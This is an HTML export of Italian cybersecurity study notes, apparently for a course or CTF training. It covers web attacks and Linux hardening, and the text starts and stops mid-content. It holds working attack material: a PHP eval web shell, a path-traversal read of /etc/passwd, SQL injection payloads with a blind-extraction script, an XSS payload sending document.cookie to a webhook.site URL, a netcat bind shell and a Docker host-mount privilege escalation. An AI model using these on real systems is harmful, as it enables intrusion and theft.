			--post-data &lt;stringa_dati&gt;</code></pre><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">WEB SECURITY</summary><div class="indented"><ul id="22f95fc6-a77c-80f3-a0d3-f802ace15b1f" class="toggle"><li><details open=""><summary><strong>Command Injection - PHP Code Injection</strong></summary><ul id="22f95fc6-a77c-8087-aa27-de632d563a3f" class="bulleted-list"><li style="list-style-type:disc"><strong>Command Injection</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-8043-8115-cf3c4fc0c16d" class="code"><code class="language-Bash">#codice generalmente PHP che esegue senza sanificazione
#si aggiungono comandi separando con
&quot;;&quot; , &quot;\n&quot;, operatori logici, &amp;&amp;, ||

#metodi per verificare che ci sia:
sleep(5) #temporizzo per vedere se attende</code></pre></li></ul><ul id="22f95fc6-a77c-80ff-b2da-d02157f00125" class="bulleted-list"><li style="list-style-type:disc"><strong>PHP Code Injection</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-8078-9431-edd0dac26bb2" class="code"><code class="language-Bash">#Metodi:

#inclusione file infetto caricato da me 
#(es. logs con errore voluto con un errore voluto &lt;?php ... ?&gt;
include ‘path/to/file’; 

#Può capitare che posso inserire direttamente il codice
&lt;?php eval($_GET[&#x27;c&#x27;]); ?&gt;
#Per attivarla è sufficiente visitare il sito passandogli c come arg
https://link/applicazione.php?c=phpinfo();</code></pre></li></ul></details></li></ul><ul id="22e95fc6-a77c-80f4-b931-e56ad9ae3a5b" class="toggle"><li><details open=""><summary><strong>File Disclosure - Path Traversal - Server Side Request Forgery (SSRF)</strong></summary><ul id="22f95fc6-a77c-80c9-a565-f503ef4ba63b" class="bulleted-list"><li style="list-style-type:disc"><strong>File Disclosure con path traversal</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-8077-9c94-d89e23246b54" class="code"><code class="language-Bash">#Funzione PHP open($url) #in sql injection
open($input + &#x27;/file&#x27;) #rubiamo un file pubblico

#Con curl - sempre passando con php il valore dello static file
curl http://link/static.php?static_file=/../../../../etc/passwd
</code></pre></li></ul><ul id="22f95fc6-a77c-8061-a58c-dec27c01eb53" class="bulleted-list"><li style="list-style-type:disc"><strong>SSRF</strong><p id="22f95fc6-a77c-8062-b104-db4ebfe8d35e" class=""><strong>Per trovare un SSRF</strong></p><ul id="22f95fc6-a77c-8088-9f6d-f0efaf79df76" class="bulleted-list"><li style="list-style-type:circle">cerco URL sospetti</li></ul><ul id="22f95fc6-a77c-80dd-a279-df40313c5349" class="bulleted-list"><li style="list-style-type:circle">A questo punto devi provare ad inserire hostnames interni come “<strong>localhost</strong>” o “<strong>192.168.1.1</strong>” o “<strong>10.0.0.1</strong>” e così via esaminando la risposta.</li></ul></li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-804f-a747-d226cb7212be" class="code"><code class="language-Bash">https://localhost/filecercato #questo inserito in input al server viene letto come se la richiesta venisse da lui
#alternativamente provo
# 192.168.1.1
# 10.0.0.1</code></pre></details></li></ul><ul id="22e95fc6-a77c-804c-bc59-c4cc507a7983" class="toggle"><li><details open=""><summary><strong>SQL Injection</strong></summary><ul id="22e95fc6-a77c-8099-8d08-fc86b0f839e2" class="bulleted-list"><li style="list-style-type:disc"><strong>SQL Injection </strong>(normale)<ul id="22e95fc6-a77c-80a8-aac8-c36b494f98df" class="bulleted-list"><li style="list-style-type:circle">Per riconoscerla provo caratteri speciali <strong>‘ \ “ `</strong> (backquote, altgr + ‘) - se crasha → </li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80f1-9cb9-c5f7a43a16ea" class="code"><code class="language-Bash">&quot; or 1=1 -- &#x27;
# 1=1 per riportare almeno un risultato - ci puoi mettere quello che ti pare

#wget per sqlinjection
wget &quot;http://target.com/page.php?id=1 UNION SELECT null,version()-- -&quot;</code></pre></li></ul><ul id="22e95fc6-a77c-805b-8e4e-efc87ac5dae0" class="bulleted-list"><li style="list-style-type:disc"><strong>UNION SQL Injection</strong><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-809c-951b-ff15bdc4125b" class="code"><code class="language-Bash">#Verifico versione sql per vedere che tipo è (per mysql è:)
union select 1,2, ..., version() 

#Per conoscere nome colonne e nome table in mysql:
&#x27; union select 1,2,..., table_name from information_schema.tables -- &#x27;
&#x27; union select 1,2,table_name, column_name from information_schema.columns -- &#x27;

#Nota: entrambe le query devono avere lo stesso numero di colonne e lo stesso tipo di dato</code></pre></li></ul><ul id="22e95fc6-a77c-803d-abdd-f697dc77525c" class="bulleted-list"><li style="list-style-type:disc"><strong>Blind SQL Injection</strong><ul id="22e95fc6-a77c-80ee-9820-eec0c245067f" class="bulleted-list"><li style="list-style-type:circle">No output completo della query, ma solo informazioni sul fatto che sia abbia avuto successo o sia fallita.</li></ul><ul id="22f95fc6-a77c-80e2-950c-f4d9a32d7a2a" class="bulleted-list"><li style="list-style-type:circle">(SELECT 1 WHERE 1=1)=&#x27;1 per verificare che funzioni il true/false (dovrebbe restituire true)</li></ul><ul id="22f95fc6-a77c-80de-83b4-f18fce70a2de" class="bulleted-list"><li style="list-style-type:circle">Se non si conoscono i caratteri specifici che possono comparire nel dato da ricostruire, può essere utile istruire il database a codificarlo in formato esadecimale. In questo modo il numero di caratteri da testare si riduce a sedici, appartenenti all&#x27;alfabeto noto composto dalle cifre da 0 a 9 e le prime sei lettere dell&#x27;alfabeto.</li></ul><ul id="22f95fc6-a77c-80b0-99a0-f65c49c82dcb" class="bulleted-list"><li style="list-style-type:circle">The <code>LIKE</code> operator is used in a <code>WHERE</code> clause to search for a specified pattern in a column. % rappresenta singoli caratteri</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-80dd-a374-db0ab0bac542" class="code"><code class="language-Bash">#esempio si cerca un qualsiasi elemento che cominci con guess
1&#x27; AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE &#x27;guess%&#x27;)=&#x27;1
#questo si fa a ripetizione con il codice python sotto:

inj = Inj(&#x27;http://web-17.challs.olicyber.it&#x27;)

dictionary = &#x27;0123456789abcdef&#x27;
result = &#x27;&#x27;

while True:
    for c in dictionary:
        question = f&quot;1&#x27; and (select 1 from secret where HEX(asecret) LIKE &#x27;{result+c}%&#x27;)=&#x27;1&quot;
        response, error = inj.blind(question)
        print(response)
        if response == &#x27;Success&#x27;: # We have a match!
            result += c
            break
    else:
        break
print(&#x27;Result:&#x27;, result)</code></pre></li></ul><ul id="22e95fc6-a77c-8097-a2f7-d23986a038d5" class="bulleted-list"><li style="list-style-type:disc"><strong>Timed SQL Injection</strong><p id="22f95fc6-a77c-8022-9cc7-ef0178daa969" class="">olto simile a quella usata per una SQL injection blind: come prima dovremo scrivere un&#x27;altra query che faccia da oracolo, ma stavolta successo o fallimento saranno discriminati sulla base del tempo di risposta - inseriamo una sleep che si attiva solo se è vera la where.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22f95fc6-a77c-80fd-809e-db48b334b2c2" class="code"><code class="language-Bash">#in pratica si aggiunge uno sleep che si avvia nel momento in cui 
#è vera l&#x27;espressione where
1&#x27; AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE &#x27;guess%&#x27;)=&#x27;1

#la logica è questa:
from time import time
# Registriamo il tempo di inizio
start = time()
# Lanciamo la query...
inj.time(...)
# Confrontiamo il tempo finale con quello di partenza
elapsed = time() - start
if elapsed &gt; 1:
    # match!</code></pre></li></ul></details></li></ul><ul id="22e95fc6-a77c-8005-83a2-fe11cebd691c" class="toggle"><li><details open=""><summary><strong>XSS</strong> - <strong>CSRF</strong></summary><ul id="22f95fc6-a77c-808c-9bfe-cde5dff0daff" class="bulleted-list"><li style="list-style-type:disc"><strong>XSS</strong><p id="22f95fc6-a77c-8018-a648-c501286d9d55" class=""> Utilizzo javascript in mezzo ad html per fare XSS</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-801e-8f60-cfaca643b387" class="code"><code class="language-Bash">#Tramite url
http://foo.bar/hello.php?name=&lt;script&gt;alert(1)&lt;/script&gt;

#con input altrimenti
&lt;img src=&quot;a&quot; onerror=&quot;fetch(&#x27;https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/&#x27; + document.cookie)&quot;&gt;&lt;/img&gt;</code></pre></li></ul><ul id="22f95fc6-a77c-80ce-a857-f53453452988" class="bulleted-list"><li style="list-style-type:disc"><strong>CSRF</strong></li></ul></details></li></ul></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">HARDENING</summary><div class="indented"><ol type="1" id="22e95fc6-a77c-80d3-a297-ca6026676dfc" class="numbered-list" start="1"><li>Attivare sudo utente per un solo file<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-805f-9ed9-da6e0493e4fc" class="code"><code class="language-Bash">sudo visudo
cysec ALL=(ALL) NOPASSWD: /usr/bin/nmap</code></pre></li></ol><ol type="1" id="22e95fc6-a77c-80e1-b5ca-dbce324a5e77" class="numbered-list" start="2"><li>Configurare sudo per far eseguire comando specifico ma senza parametri<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-8047-9ac9-dbe7ec1b2a85" class="code"><code class="language-Bash">sudo visudo
cysec ALL=(ALL) NOPASSWD: /usr/bin/nmap &quot;&quot;</code></pre></li></ol><ol type="1" id="22e95fc6-a77c-8043-aa1b-ce263a4a4c80" class="numbered-list" start="3"><li>Cercare tutti gli eseguibili con SUID | SGID | Sticky bit<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-804b-a4ba-f2ff9c0bf7ee" class="code"><code class="language-Bash">find / -perm -4000 
find / -perm -2000
find / -perm -1000</code></pre><p id="22e95fc6-a77c-807a-b3a4-ca268324140e" class="">(Nota che / è il punto di partenza, cioè root)</p><p id="22e95fc6-a77c-8007-9f97-c251177a4a7c" class="">
</p></li></ol><ol type="1" id="22e95fc6-a77c-8073-b3dd-f78fab08f4b9" class="numbered-list" start="4"><li>Creare una shell aperta a tutti in attesa di connessione (e connettercisi)<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-8055-9579-f65c0e1853d3" class="code"><code class="language-Bash">nc -lvp 4444 -e /bin/bash
#Per connettersi: nc &lt;ip&gt; &lt;port&gt;</code></pre></li></ol><p id="22e95fc6-a77c-8036-bc7f-efcfab98d3dd" class="">
</p><ol type="1" id="22e95fc6-a77c-80e0-8ac8-e523f716b95a" class="numbered-list" start="5"><li>Modificare configurazione pam per richiedere caratteristiche minime alle password (min 8 caratteri, maiuscole, minuscole, simboli)<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-807f-a781-f9142eda4f43" class="code"><code class="language-Bash">#backup e modifica
sudo cp /etc/pam.d/common-password /etc/pam.d/common-password.bak
sudo nano /etc/pam.d/common-password

#modifico la riga della password che richiede i requisiti
password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 ocredit=-1

#oppure usando SED &#x27;/pam_pwquality\.so/ c\ significa cambia la riga 
#/pam_pwquality.so con quella che segue
sudo sed &#x27;/pam_pwquality\.so/ c\password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 ocredit=-1&#x27; /etc/pam.d/common-password
</code></pre></li></ol><p id="22e95fc6-a77c-8008-84e1-d8875234b5f5" class="">
</p><ol type="1" id="22e95fc6-a77c-805c-9aff-c0b429a76f15" class="numbered-list" start="6"><li>Inserisci un password per grub per non permettere l’avvio dell’os con parametri del kernel non standard<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-802f-97ce-e1e78f18d240" class="code"><code class="language-Bash">#creo la password sha
grub-mkpasswd-pbkdf2
#modifico il file di configurazione inserendo la password ottenuta
sudo nano /etc/grub.d/40_custom #40_custom per modificare il grub!
	#inserisco in NANO
	set superusers=&quot;admin&quot;
	password_pbkdf2 admin &lt;password_di_prima&gt;

#faccio update del grub
sudo update-grub</code></pre></li></ol></div></details><p id="22e95fc6-a77c-808c-a645-d3b3a706ea9a" class=""><div class="indented"><ol type="1" id="22e95fc6-a77c-8085-80cf-f351fc8d720a" class="numbered-list" start="7"><li>Rendi la cartella /var/log leggibile solo da root<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-801d-badd-f8f75072758a" class="code"><code class="language-Bash">sudo chown root /var/log
sudo chmod 400 /var/log

#verifico
ls -l /var/log </code></pre></li></ol></div></p><p id="22e95fc6-a77c-8054-ae77-e82d179a8509" class=""><div class="indented"><ol type="1" id="22e95fc6-a77c-80de-9e4c-cc16723d0b43" class="numbered-list" start="8"><li>Configura utente per poter fare cat dei logs ma non essere amministratore<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80ed-8b76-c2c333e14f13" class="code"><code class="language-Bash">#modifico sudoers
sudo visudo
#aggiungo o modifico
cysec ALL=(root) NOPASSWD: /bin/cat /var/log/*</code></pre></li></ol></div></p><p id="22e95fc6-a77c-8043-b88a-fbce67ff1d14" class=""><div class="indented"><ol type="1" id="22e95fc6-a77c-80e3-be7e-f926dfe274e2" class="numbered-list" start="9"><li>Trova tutti i processi che hanno un file descriptor aperto dentro la cartella /var/log <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-807a-8831-c0d7fbd00ca2" class="code"><code class="language-Bash">#uso il comando lsof ricorsivamente (+D)
sudo lsof +D /var/log</code></pre></li></ol></div></p><p id="22e95fc6-a77c-80aa-99fe-e9a8db205f6b" class=""><div class="indented"><ol type="1" id="22e95fc6-a77c-809a-8260-dd363d6b651e" class="numbered-list" start="10"><li>Usa Docker per effettuare una privilege escalation<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80ff-b9b9-f55e4088da79" class="code"><code class="language-Bash">#suggerito da chat *non ho potuto farlo su vm*
docker run -v /:/mnt --rm -it debian chroot /mnt
# in pratica avvia una shell interattiva (-it):
# monta il filesystem dell&#x27;host / in docker su :/mnt
# usando debian come immagine di base
# e cambiando la radice del filesystem in /mnt
# Così l&#x27;utente base può fare quello che gli pare!</code></pre><p id="22e95fc6-a77c-80c3-8e1f-efb001c70e09" class="">
</p></li></ol><ol type="1" id="22e95fc6-a77c-8090-b33e-fb5907924d3f" class="numbered-list" start="11"><li>Cerca se ci sono directory/file scrivibili da tutti gli utenti in home<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-807a-a9be-cd193d4eafd7" class="code"><code class="language-Bash"># -type d cerca e directories
# -o=w indica il permesso che cerco
find /home -type d -perm -222

#per i file sarebbe
find /home -type f -perm -222</code></pre></li></ol><p id="22e95fc6-a77c-8069-b4bc-e9e8e94bfb92" class="">
</p><ol type="1" id="22e95fc6-a77c-80f0-bd4b-c60ddebbc7d9" class="numbered-list" start="12"><li>Crea un utente la cui password scade ogni giorno<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-80e3-87c7-def6a984118b" class="code"><code class="language-Bash">#uso useradd e passwd per cambiare creare e cambiare utente, poi
#chage per cambiare le impostazioni della password
sudo useradd -m paperino
sudo passwd paperino
sudo chage -M 1 paperino</code></pre></li></ol></div></p><p id="22e95fc6-a77c-8000-9cda-c0f8e76132dd" class=""><div class="indented"><ol type="1" id="22e95fc6-a77c-80c4-9182-df48fb187aeb" class="numbered-list" start="13"><li>Imposta iptables per permettere l’accesso alla macchina solo via SSH (TCP port 22)<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22e95fc6-a77c-8051-a546-e16e49621196" class="code"><code class="language-Bash">#flusho tutta la configurazione precedente
sudo iptables -F INPUT
sudo iptables -F OUTPUT
sudo iptables -F FORWARD

#setto policy di base per droppare tutto
sudo iptables -P INPUT DROP
